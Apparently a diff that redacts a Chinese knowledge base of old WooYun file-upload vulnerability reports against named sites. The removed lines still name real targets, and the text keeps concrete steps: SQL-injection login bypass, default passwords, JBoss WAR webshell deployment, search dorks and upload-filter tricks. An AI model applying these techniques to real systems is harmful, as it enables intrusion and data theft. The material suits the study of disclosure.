 **绕过**: 直接利用
 
@@ -7794,7 +7794,7 @@
 
 **详情**: 其实还是	drops文章《上传文件的陷阱》带来的问题。dz2.5以下版本修改头像处未检查图片文件的合法性，可以上传.jpg后缀的swf文件。使用这个swf文件发起恶意请求读取页面源码就能获取到formhash 有formhash之后。。想干嘛就干嘛了具体文件/uc_server/control/user.php 281行onuploadavatar函数$imgtype = array(1 => '.gif', 2 => '.jpg', 3 => '.png');只检查了后缀而不像3.0以上用库检查了图片格式
 
-**POC**: 步骤1、新建一个获取页面源码 提取formhash 然后用formhash发送添加副站长请求的swf，保存为.jpg后缀2、注册一个账号，去/home.php?mod=spacecp&ac=avatar上传上一步生成的.jpg后缀的swf文件并抓包 上传后的地址应该是http://192.168.1.104/uc_server/data/tmp/upload{uid}.jpg这样的3、新建一个html页面，把上一步拿到的头像地址当作flash加载到页面。4、引诱管理员访问这个html页面，就会在后台把你的账号添加为副站长
+**POC**: 步骤1、新建一个获取页面源码 提取formhash 然后用formhash发送添加副站长请求的swf，保存为.jpg后缀2、注册一个账号，去/home.php?mod=spacecp&ac=avatar上传上一步生成的.jpg后缀的swf文件并抓包 上传后的地址应该是http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -7814,9 +7814,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1. 首先是在线直播的后台；比如：工信部的http://zhibo.miit.gov.cn:8080/direct/displayLogin.do这里存在默认口令，admin admin，有的版本没有改；不过要是改了也没有关系；你可以使用经典的  1'or'1'='1 ,用户名和密码都是这就可以登入。进入以后，选择直播管理—点击第一个直播主题“信息化与工业化融合成果展览会”选择“直播管理者”，记录管理者的帐号和密码；先退出。然后以刚才的帐号和密码，选择对应的主题，登录登录进入，选择导播选择“增加图片”，在新窗口中，右键属性，查看添加图片的具体link比如此处的是：http://zhibo.miit.gov.cn:8080/direct/manager/addpicture.jsp?menuid=45在新窗口打开以上连接；另存为本地html文件；打开编辑var str= document.a
+**详情**: 1. 首先是在线直播的后台；比如：工信部的https://example.com/[已脱敏] admin，有的版本没有改；不过要是改了也没有关系；你可以使用经典的  1'or'1'='1 ,用户名和密码都是这就可以登入。进入以后，选择直播管理—点击第一个直播主题“信息化与工业化融合成果展览会”选择“直播管理者”，记录管理者的帐号和密码；先退出。然后以刚才的帐号和密码，选择对应的主题，登录登录进入，选择导播选择“增加图片”，在新窗口中，右键属性，查看添加图片的具体link比如此处的是：https://example.com/[已脱敏] str= document.a
 
-**POC**: jsp脚本木马已经上传成功；比如公安部的其他的几个我就不测试了。比如：http://fangtan.sasac.gov.cn/direct/manager/addpicture.jsp?menuid=1
+**POC**: jsp脚本木马已经上传成功；比如公安部的其他的几个我就不测试了。比如：https://example.com/[已脱敏]
 
 **绕过**: 编码绕过
 
@@ -7836,7 +7836,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、网站地址http://www.ahwt.com.cn/2、可以通过webdav写权限直接上传一句话木马3、访问小马网站权限控制的也不好，可以浏览全部盘符4、可以通过phpmyadmin或者菜刀，对数据进行操作，可脱裤。5、网站被挂了20+黑页黑页比较多，就展示这么几个吧。
+**详情**: 1、网站地址https://example.com/[已脱敏]
 
 **POC**: 1、20+黑页
 
@@ -7858,7 +7858,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 前人好像有提交过这个的： http://**.**.**.**/bugs/wooyun-2014-066332安徽汇能科技信息技术有限公司成立于2004年4月，汇能公司自成立以来,致力于为税务、政府、公安、工商、安全、烟草、院校、企业等部门和行业提供服务，并承接了大量网络工程。在多年的系统集成与软件开发中积累了丰富的经验和雄厚的技术力量。公司目前已取得了ISO9001认证、计算机系统集成三级资质认证、安全技术防范资格证书、软件产品登记证书、软件企业认定证书、办公自动化管理系统证书、无线电通信网络工程设计许可证、高新技术企业认证和校园网工程建设许可证等资质证书。任意文件上传漏洞2处：[构造表单，表单在测试代码]/admin/xtsz/lanmuhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/uploadAct.jsp/main/mo
+**详情**: 前人好像有提交过这个的： http://**.**.**.**/bugs/wooyun-2014-066332安徽汇能科技信息技术有限公司成立于2004年4月，汇能公司自成立以来,致力于为税务、政府、公安、工商、安全、烟草、院校、企业等部门和行业提供服务，并承接了大量网络工程。在多年的系统集成与软件开发中积累了丰富的经验和雄厚的技术力量。公司目前已取得了ISO9001认证、计算机系统集成三级资质认证、安全技术防范资格证书、软件产品登记证书、软件企业认定证书、办公自动化管理系统证书、无线电通信网络工程设计许可证、高新技术企业认证和校园网工程建设许可证等资质证书。任意文件上传漏洞2处：[构造表单，表单在测试代码]/admin/xtsz/lanmuhttps://example.com/[已脱敏]
 
 **POC**: 随机测试了：1、2、
 
@@ -7902,7 +7902,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.进后台http://oa.t3.com.cn用户名：zhouyi密码:123456WooYun: 中演票务通某后台弱口令2.1找上传上传点：http://oa.t3.com.cn/Share/OrgUpFile.aspx2.2被黑名单拦截了3.文件名后面带.绕过
+**详情**: 1.进后台https://example.com/[已脱敏] 中演票务通某后台弱口令2.1找上传上传点：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -7946,7 +7946,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: GET /?cityId=13&cityName=%E5%B9%BF%E5%B7%9E HTTP/1.1Host: m.maizuo.comProxy-Connection: keep-aliveAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36Referer: http://m.maizuo.com/city'Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.
+**详情**: GET /?cityId=13&cityName=%E5%B9%BF%E5%B7%9E HTTP/1.1Host: m.maizuo.comProxy-Connection: keep-aliveAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36Referer: https://example.com/[已脱敏]'Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.
 
 **POC**: IP被封，无法深入查询出数据返回200正常返回500错误
 
@@ -7968,7 +7968,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上传地址：http://event1.wanmei.com/jsp/playershow/upswf.jsp?siteid=8抓包改包上传。那可以上传任意文件类型文件。但由于服务器执行限制，文件不能执行。但想到了可以上传和执行 shtml 类型，再参考：http://www.htmer.com/article/730.htm可以通过 include：包含某些内容，记得在win环境下可以包含从以获取文件的内容，但在linux下是直接执行。但经测试，好像也是服务器有限制了，不能包含上级目录的文件。大家可以讨论下还有什么可以利用的。。。
+**详情**: 上传地址：https://example.com/[已脱敏] shtml 类型，再参考：https://example.com/[已脱敏] include：包含某些内容，记得在win环境下可以包含从以获取文件的内容，但在linux下是直接执行。但经测试，好像也是服务器有限制了，不能包含上级目录的文件。大家可以讨论下还有什么可以利用的。。。
 
 **POC**: POST /servlet/upload HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------Ij5GI3Ef1gL6ae0Ij5KM7Ij5Ij5cH2User-Agent: Shockwave FlashHost: event1.wanmei.comContent-Length: 440------------Ij5GI3Ef1gL6ae0Ij5KM7Ij5Ij5cH2Content-Disposition: form-data; name="Filename"xxx------------
 
@@ -7990,7 +7990,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 本来这站不算什么的 但挂有 gov 的名义 必须和谐http://www.whwg.gov.cn/Admin/
+**详情**: 本来这站不算什么的 但挂有 gov 的名义 必须和谐https://example.com/[已脱敏]
 
 **POC**: 直接上传xxoo挂有 gov 的名义 必须和谐
 
@@ -8014,7 +8014,7 @@
 
 **详情**: 后台万能密码绕过、权限绕过、后台任意文件上传
 
-**POC**: http://www.qjxczj.com/admin/login.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -8034,7 +8034,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://developer.meizu.com/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/simpleuploader?Type=ImageFCK本地构造
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -8058,7 +8058,7 @@
 
 **详情**: 其实，他们的这套系统用户。。 很多，请看图这套系统直接接到学校的核心数据库，如果真的上线，将会集成校园的OA email 短信等各种功能，这套系统的安全性直接关系到了学校的核心。。。。。。。网络中心(默认安装)卸载[学工管理] 学工管理(默认安装)卸载[失物招领] 失物招领(默认安装)卸载[图书系统] 图书系统(默认安装)卸载[毕业设计管理] 毕业设计...(默认安装)卸载[网络教学] 网络教学(默认安装)卸载[教务管理系统] 教务管理...(默认安装)卸载[短信平台] 短信平台(112)卸载[日志] 日志(43)卸载[论坛] 论坛(55)卸载[一卡通系统] 一卡通系统(310)卸载[校历] 校历(190)卸载[通知] 通知(121)卸载[日程] 日程(56)卸载[组织] 组织(61)卸载[分享] 分享(25)卸载[广告申请] 广告申请(22)卸载[EDU邮箱] EDU邮箱(49)卸载[相
 
-**POC**: WooYun: 大红鹰学院高校数字校园解决方案 (上传 csrf xss 文件读取)漏洞集这是上一次的测试内容，因为是拿自己学校测试的，结果老师放假漏洞忽略了。你懂的 真正的漏洞是东软集团。1、上传。 发消息的地方允许上传http://cas.nbdhyu.edu.cn/cas/login?service=http%3A%2F%2Fi.nbdhyu.edu.cn%2Fdcp%2FFileDownLoadloadServlet%3Fmodule%3Dstorage%26sName%3DfileDownload%26upload_path%3Dstorage-path%26folder_id%3D
+**POC**: WooYun: 大红鹰学院高校数字校园解决方案 (上传 csrf xss 文件读取)漏洞集这是上一次的测试内容，因为是拿自己学校测试的，结果老师放假漏洞忽略了。你懂的 真正的漏洞是东软集团。1、上传。 发消息的地方允许上传https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8080,7 +8080,7 @@
 
 **详情**: 过滤不严导致任意上传漏洞
 
-**POC**: http://fenlei.sogou.com/newhot/admin/upload.jsp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8100,9 +8100,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 还记得我在:WooYun: 中央戏剧学院漏洞合集(目前流行抓明星?)曾经发布过里头的一个jboss，通过后续研究，我发现几乎国内大部分采用该系统的都存在jboss的默认访问配置，当然，可以远程写马了。补一张之前中戏的图在实例中，不少存在jboss默认配置，允许通过远程部署war包进行写马。这种系统存在jboss漏洞大概是95%存在这样问题的有：安徽新华学院oa:http://oa.axhu.cn/jmx-console/安徽工程大学oa:http://edoas.ahpu.edu.cn/jmx-console/泰安市教育局:http://www.taian.edu.cn/jmx-console/
+**详情**: 还记得我在:WooYun: 中央戏剧学院漏洞合集(目前流行抓明星?)曾经发布过里头的一个jboss，通过后续研究，我发现几乎国内大部分采用该系统的都存在jboss的默认访问配置，当然，可以远程写马了。补一张之前中戏的图在实例中，不少存在jboss默认配置，允许通过远程部署war包进行写马。这种系统存在jboss漏洞大概是95%存在这样问题的有：安徽新华学院oa:https://example.com/[已脱敏]
 
-**POC**: jboss拿shell方法如下：页面中搜索“jboss.deployment”，并找到* flavor=URL,type=DeploymentScanner在该页面中去寻找“void addURL()”函数在文本框添加你想添加的war地址即可。部署成功后会给出相应的提示.随便拿一个测试证明确实可以远程写shell:http://edoas.sxufe.edu.cn/cmd/index.jsp漏洞发现方式，主要还是通过搜索引擎，经过研究，发现可以通过如下方式获取这种oa系统：google搜索：intitle:教育电子政务平台或者：inurl:edoas2 都可以搜索到，edoas2其实是这oa里
+**POC**: jboss拿shell方法如下：页面中搜索“jboss.deployment”，并找到* flavor=URL,type=DeploymentScanner在该页面中去寻找“void addURL()”函数在文本框添加你想添加的war地址即可。部署成功后会给出相应的提示.随便拿一个测试证明确实可以远程写shell:https://example.com/[已脱敏] 都可以搜索到，edoas2其实是这oa里
 
 **绕过**: 直接利用
 
@@ -8166,7 +8166,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.老规矩了，是这个站点呢http://ask.lenovomobile.com/联想乐问吧，是咨询关于联想产品问题的地方吧！这次不牛B了。2.我也来问个问题吧，这里只是测试呢！一不小心瞅到有个上传图片的地方呢！have a try！我上传一个正常图片看看先。3.上传test.jpg吧，我最常用的头像，哈哈！点击上传咯4.上传的时候，顺便抓个包看下怎么个上传的，看到filename="test.jpg",这里是不是可以改下呢？5.看下返回的结果吧，可能包含有文件上传后的相对地址哦！果不其然呢！6.访问下这个地址，结果如下：
+**详情**: 1.老规矩了，是这个站点呢https://example.com/[已脱敏] a try！我上传一个正常图片看看先。3.上传test.jpg吧，我最常用的头像，哈哈！点击上传咯4.上传的时候，顺便抓个包看下怎么个上传的，看到filename="test.jpg",这里是不是可以改下呢？5.看下返回的结果吧，可能包含有文件上传后的相对地址哦！果不其然呢！6.访问下这个地址，结果如下：
 
 **POC**: 7.再次上传，不过这个时候要抓包将filename的值test.jpg改成test.php，截图如下：8.再看看返回的地址呗，哎呦我操，服务端真的没做判断呢，后缀还是.php9.啥也不说了，操上菜刀：
 
@@ -8188,7 +8188,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 家庭医生www.familydoctor.com.cn  权重PR真高啊  这要是流到黑产  后果严重ok  涉及用户 医生 加起来过百万的信息正题：http://ask.familydoctor.com.cn/upimg.aspx   图片上传使用BURP抓包  直接改  可直接上传aspx马马：http://ask.familydoctor.com.cn/UploadFile/TopicImg/20130928/0928095805104.aspx菜刀连之。上图：涉及多少数据库  多少用户  管理清楚  我也数不过来提权什么就不做了   数据库没有动  管理可查日志ok  谢谢
+**详情**: 家庭医生www.familydoctor.com.cn  权重PR真高啊  这要是流到黑产  后果严重ok  涉及用户 医生 加起来过百万的信息正题：https://example.com/[已脱敏]   图片上传使用BURP抓包  直接改  可直接上传aspx马马：https://example.com/[已脱敏]  多少用户  管理清楚  我也数不过来提权什么就不做了   数据库没有动  管理可查日志ok  谢谢
 
 **POC**: (见原文)
 
@@ -8210,9 +8210,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 介绍可利用搜索引擎查询系统地址百度搜索“新点网络协同办公系统”新点网络协同办公系统V7.0存在任意文件上传漏洞，可以成功上传aspx文件并执行。
+**详情**: 介绍可利用搜索引擎查询系统地址某搜索引擎搜索“新点网络协同办公系统”新点网络协同办公系统V7.0存在任意文件上传漏洞，可以成功上传aspx文件并执行。
 
-**POC**: 演示目标：广西住房和城乡建设厅网--广西建设网系统地址：http://sys67.gxcic.net:8844/oa7/login.aspx利用条件：a)下载系统用户名列表，下载地址为http://sys67.gxcic.net:8844/oa7/ExcelExport/人员列表.xls，规律为http://site/ExcelExport/人员列表.xlsb)尝试密码11111或其他弱口令，新点的系统默认初始口令为11111；本次演示中无需密码尝试，公告中已经给出密码为66666c)登录协同办公系统,如果登录时出现”输入字符串的格式不正确“请使用firefox进行登录；利用工具：菜刀+bur
+**POC**: 演示目标：广西住房和城乡建设厅网--广西建设网系统地址：https://example.com/[已脱敏])下载系统用户名列表，下载地址为https://example.com/[已脱敏])尝试密码11111或其他弱口令，新点的系统默认初始口令为11111；本次演示中无需密码尝试，公告中已经给出密码为66666c)登录协同办公系统,如果登录时出现”输入字符串的格式不正确“请使用firefox进行登录；利用工具：菜刀+bur
 
 **绕过**: 直接利用
 
@@ -8234,7 +8234,7 @@
 
 **详情**: uploadPic.asp?actionType=mod&picName=miao.asp上传漏洞，任意用户都可以 访问到此文件。任意用户都可以使用此文件上传文件到服务器
 
-**POC**: 大马：http://www.czgtj.gov.cn/inc/top.asp
+**POC**: 大马：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8256,7 +8256,7 @@
 
 **详情**: 协康医药存在FCKeditor文件上传漏洞，可以上传任意文件，导致存在网站挂马和任意代码执行的风险
 
-**POC**: 见http://www.818666.com/fckeditor/editor/filemanager/browser/default/browser.html?&Connector=../../connectors/asp/connector.asp
+**POC**: 见https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8276,7 +8276,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 同样是用友ICC的问题.https://95516.unionpay.com/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/uploadFlash.php可以直接获取网站管理权限
+**详情**: 同样是用友ICC的问题.https://example.com/[已脱敏]
 
 **POC**: 由于该网站过于敏感.故没有做测试.请自行测试.
 
@@ -8300,7 +8300,7 @@
 
 **详情**: 搜狐畅游网某分站任意文件上传漏洞
 
-**POC**: 发现搜狐游戏旗下的畅游网的一个分站存在任意文件上传漏洞http://static.wanjiacun.cyou.com/upload.jsp这里可任意文件上传获得WEBSHELL看了下权限很大。可进行搜狐畅游的内网渗透
+**POC**: 发现搜狐游戏旗下的畅游网的一个分站存在任意文件上传漏洞https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8320,7 +8320,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：http://125.35.5.78:1000/下了个ppt，里面有：上传页面：http://125.35.5.78:1000/test.aspx
+**详情**: 地址：http://[IP已脱敏]
 
 **POC**: 老服务器了，不提权了
 
@@ -8364,7 +8364,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 咳咳，在找一些资料的时候看到了xlz0iza1牛的一个通用型0day于是就试了一下wooyun.org/bugs/wooyun-2010-090683http://219.138.90.130:83/OT.OA.WEB/UIFrameWork/login.aspx登录页面漏洞页面为219.138.90.130:83/OT.OA.WEB/OA_Mail/ftb.imagegallery.aspx这个ftb.imagegallery.aspx任意上传的洞当真是极老极老的了此上传需要结合解析漏洞xxx.aspx;.jpg
+**详情**: 咳咳，在找一些资料的时候看到了xlz0iza1牛的一个通用型0day于是就试了一下wooyun.org/bugs/wooyun-2010-090683http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -8386,7 +8386,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: URL：http://www.cdjcy.gov.cn/漏洞URL：http://125.71.206.32:8082/WSJB/WSJBApply.aspx?dwbm=510100.Net环境,上传处未限制Ashx和Asmx，后者上传无法运行，提示Asmx脚本只能在本地运行，于是打算先传个Ashx脚本然后在当前目录下生成Aspx文件(目标不能执行Asp文件)，嗦嘎,菜刀连之。
+**详情**: URL：https://example.com/[已脱敏])，嗦嘎,菜刀连之。
 
 **POC**: (见原文)
 
@@ -8408,9 +8408,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先，IP 118.145.15.66是所有代理商网站所在的服务器，随便查一下。随便找一个进行尝试构建上传代码上传一个ASP文件这是文件地址访问后下载传说中的数据库这是在主站的用户名密码，果断的弱口令啊有木有登录上去，我貌似不小心搞到内部人的号了 - -|||，各种业务都免费哈哈哈。
+**详情**: 首先，IP [IP已脱敏]是所有代理商网站所在的服务器，随便查一下。随便找一个进行尝试构建上传代码上传一个ASP文件这是文件地址访问后下载传说中的数据库这是在主站的用户名密码，果断的弱口令啊有木有登录上去，我貌似不小心搞到内部人的号了 - -|||，各种业务都免费哈哈哈。
 
-**POC**: 首先，IP 118.145.15.66是所有代理商网站所在的服务器，随便查一下。随便找一个进行尝试构建上传代码上传一个ASP文件这是文件地址访问后下载传说中的数据库这是在主站的用户名密码，果断的弱口令啊有木有登录上去，我貌似不小心搞到内部人的号了 - -|||，各种业务都免费哈哈哈。
+**POC**: 首先，IP [IP已脱敏]是所有代理商网站所在的服务器，随便查一下。随便找一个进行尝试构建上传代码上传一个ASP文件这是文件地址访问后下载传说中的数据库这是在主站的用户名密码，果断的弱口令啊有木有登录上去，我貌似不小心搞到内部人的号了 - -|||，各种业务都免费哈哈哈。
 
 **绕过**: 直接利用
 
@@ -8430,9 +8430,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 官方域名 www.setv.sh.cn  IP 101.226.163.131C段查询同服务器域名查询IP 101.226.163.131http://photo.shlll.nethttp://www.shlll.nethttp://wk.shlll.nethttp://renwen.shlll.nethttp://chongming.shlll.nethttp://www.setv.sh.cn  (目标站点)http://hdz.shlll.nethttp://jsmx.shlll.nethttp://jcwg.shlll.nethttp://cmcourse.shlll.nethttp://zzsy.shlll.net----------------------------------主站存在注入 但是权限太小 无法进行下一步渗透 所以我来个注册调转到这个地址http://membe
+**详情**: 官方域名 www.setv.sh.cn  IP [IP已脱敏]C段查询同服务器域名查询IP [IP已脱敏]https://example.com/[已脱敏]  (目标站点)https://example.com/[已脱敏] 但是权限太小 无法进行下一步渗透 所以我来个注册调转到这个地址http://membe
 
-**POC**: 在注册成功后找到了活动这个连接地址http://act.shlll.net/event/addtopic/AC644B5A6C0FCB1B?t=1发表话题 图片上传burpsuite利用burpsuite截取上传数据burpsuite利用方式就是监听本地127.0.0.1 8080端口浏览器本地改成127.0.0.1 8080端口 代理然后把咱们的APSX直接上传大马图片格式<code>POST /resources/ueditor1_3_6-utf8-net/net/imageUp.ashx HTTP/1.1Accept: */*Accept-Language: zh-CNReferer: 
+**POC**: 在注册成功后找到了活动这个连接地址https://example.com/[已脱敏] 图片上传burpsuite利用burpsuite截取上传数据burpsuite利用方式就是监听本地127.0.0.1 8080端口浏览器本地改成127.0.0.1 8080端口 代理然后把咱们的APSX直接上传大马图片格式<code>POST /resources/ueditor1_3_6-utf8-net/net/imageUp.ashx HTTP/1.1Accept: */*Accept-Language: zh-CNReferer: 
 
 **绕过**: 直接利用
 
@@ -8452,9 +8452,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: #相关信息:1.事件网址：http://www.artword323.com 技术支持：重庆沃尔德科技有限公司/2.联系人：张小姐电话号码：023-67031381点击通话传真号码：023-67031381官方网站：http://www.wordtech.net详细地址：北部新区海王星科技大厦Ａ区一楼来源:http://www.yjbys.com/company/1229266.html（一）.以其中一个网址为例:渝北区气象为农服务后台管理系统http://ybtv.artword323.com:8012/login.aspx1.弱口令登入:admin/123456后台界面如下:2.任意文件上传并可导致提权服务器:上传点:1.镇街图片管理-修改/Admin/TVDictionary/镇街图片管理Add.aspx?OType=修改&IsD=true&Id=17&ddate=141166413
+**详情**: #相关信息:1.事件网址：https://example.com/[已脱敏] 技术支持：重庆沃尔德科技有限公司/2.联系人：张小姐电话号码：023-67031381点击通话传真号码：023-67031381官方网站：https://example.com/[已脱敏]
 
-**POC**: 通用性例子，不再一一提权渗透了:http://[重庆下面县城拼音首位字母]tv.artword323.com:8012/如：开  县http://kxtv.artword323.com:8012/潼  南http://tnantv.artword323.com:8012/渝北区http://ybtv.artword323.com:8012/大  足http://dztv.artword323.com:8012/梁  平http://lptv.artword323.com:8012/酉  阳http://yytv.artword323.com:8012/巫  山http://wstv.artwo
+**POC**: 通用性例子，不再一一提权渗透了:http://[重庆下面县城拼音首位字母]tv.artword323.com:8012/如：开  县https://example.com/[已脱敏]  南https://example.com/[已脱敏]  足https://example.com/[已脱敏]  平https://example.com/[已脱敏]  阳https://example.com/[已脱敏]  山https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8474,7 +8474,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://bbs.qidian.com/论坛发帖插图处可利用火狐抓包改包上传木马
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -8496,7 +8496,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://crm.99114.com/common/jsp/file.jsp看到这个页面能上传然后就试试看了，上传了个小马，结果找不到呀，随手试试，结果...下列目录呀...果断找到了小马...然后balabla...看到了CDEZ盘.... 我发誓只是随便看了看验证了下，然后就删了小马肥家吃饭了..http://crm.99114.com/business/http://crm.99114.com/userfile/attach/http://crm.99114.com/admin/http://crm.99114.com/common/
+**详情**: https://example.com/[已脱敏] 我发誓只是随便看了看验证了下，然后就删了小马肥家吃饭了..https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -8518,7 +8518,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.wahaha.com.cn:8080/tz/jsp/tz/active2009/index.jsp在这个地址注册个账户，然后上传图片，在jsp木马头 加个GIF89a能直接上传成功
+**详情**: https://example.com/[已脱敏] 加个GIF89a能直接上传成功
 
 **POC**: (见原文)
 
@@ -8528,8 +8528,8 @@
 ---
 
 ---
-### [wooyun-2014-074364] 中国电信某省分站文件任意上传漏洞
-**厂商**: 中国电信综合平台开发运营中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2014-074364] 某运营商某省分站文件任意上传漏洞
+**厂商**: 某运营商综合平台开发运营中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -8542,7 +8542,7 @@
 
 **详情**: 1.该上传点应该属于权限绕过或者是编辑器漏洞
 
-**POC**: 一：上传点地址：1.http://fj.189.cn/ewebeditor/ewebeditor.htm?id=body&style=popup2.http://fj.189.cn/ewebeditor/ewebeditor.htm?id=body&3.http://fj.189.cn/ewebeditor/ewebeditor.htm这三个地址打开页面是一样的。直接上图二.这里说明一下，打开的时候，有些浏览器会提示你安装/ewebeditor编辑器环境，然后安装就可以了，还有就是要先点击文本然后再点击设计，才会出现可编辑的页面，最后点击上传按钮即可。三：然后上传，可以上传成功，但是发现是已时
+**POC**: 一：上传点地址：1.https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -8550,8 +8550,8 @@
 ---
 
 ---
-### [wooyun-2010-0391] 网易某分站权限绕过以及文件上传漏洞
-**厂商**: 网易 | **年份**: 2010 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2010-0391] 某互联网公司某分站权限绕过以及文件上传漏洞
+**厂商**: 某互联网公司 | **年份**: 2010 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 认证接口, 上传功能
 
@@ -8562,9 +8562,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 登录链接：http://design.163.com/ria/login.php在页面上可以下载到审批人联系人方式的压缩文件，通过里面文本文档中的联系人方式可以登录到系统中区。通过新添加广告可以找到上传文件的地方，该处对上传的文件类型无任何检查和过滤，造成可以直接上传PHP类型的WEB后门，通过后门可以查看管理服务器文件，并执行命令等。由现在的两处问题可以看出来该网站中还应该存在其他的安全问题。
+**详情**: 登录链接：https://example.com/[已脱敏]
 
-**POC**: http://design.163.com/ria/login.php通过leiwang用户登录上传WEB后门http://design.163.com/riahttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/71/2010-09-01/1283308117.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8584,9 +8584,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 某站任意文件上传漏洞连接：http://news.7k7k.com/ceshi/上传图片可上传任意文件抓包修改后缀发现php上传后无法解析，上传个html吧钓鱼，挂马这个还是没问题的
+**详情**: 某站任意文件上传漏洞连接：https://example.com/[已脱敏]
 
-**POC**: 某站任意文件上传漏洞连接：http://news.7k7k.com/ceshi/上传图片可上传任意文件抓包修改后缀发现php上传后无法解析，上传个html吧钓鱼，挂马这个还是没问题的
+**POC**: 某站任意文件上传漏洞连接：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8606,9 +8606,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://stu.zoomla.cn/guestbook/Default.aspx?CateID=2这个页面中有个编辑器,点击超链接可以止传附件,抓包修改后缀 可上传aspx文件代码写入rar抓包修改后缀
+**详情**: https://example.com/[已脱敏] 可上传aspx文件代码写入rar抓包修改后缀
 
-**POC**: http://stu.zoomla.cn/UploadFiles/UserUpload/2015/9/201509010711193145.aspx
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8628,7 +8628,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址 http://www.21315.com/先随便注册一个帐号吧后台http://credit.21315.com.cn/sysadmin/login.html
+**详情**: 地址 https://example.com/[已脱敏]
 
 **POC**: 随便上传文件asp  php 等等  看图说话吧直接拿下了  剩下的随意可以利用吧  里面那么多企业信息  大家可以发挥想象吧 你懂得
 
@@ -8672,9 +8672,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://alliance.pptv.com/include/fckeditor/editor/fckeditor.html功能完全 FCK 突破什么的 就不用我说了吧http://alliance.pptv.com/images/down.jpg/1.php再搭配上这个 基本秒杀了吧 - -我没有入侵 但是不说明漏洞不存在 如果非得要我入侵了 才能说明漏洞的严重 那我也没什么好说的了
+**详情**: https://example.com/[已脱敏] FCK 突破什么的 就不用我说了吧https://example.com/[已脱敏] 基本秒杀了吧 - -我没有入侵 但是不说明漏洞不存在 如果非得要我入侵了 才能说明漏洞的严重 那我也没什么好说的了
 
-**POC**: http://alliance.pptv.com/include/fckeditor/editor/fckeditor.html功能完全 FCK 突破什么的 就不用我说了吧http://alliance.pptv.com/images/down.jpg/1.php再搭配上这个 基本秒杀了吧 - -
+**POC**: https://example.com/[已脱敏] FCK 突破什么的 就不用我说了吧https://example.com/[已脱敏] 基本秒杀了吧 - -
 
 **绕过**: 直接利用
 
@@ -8694,7 +8694,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
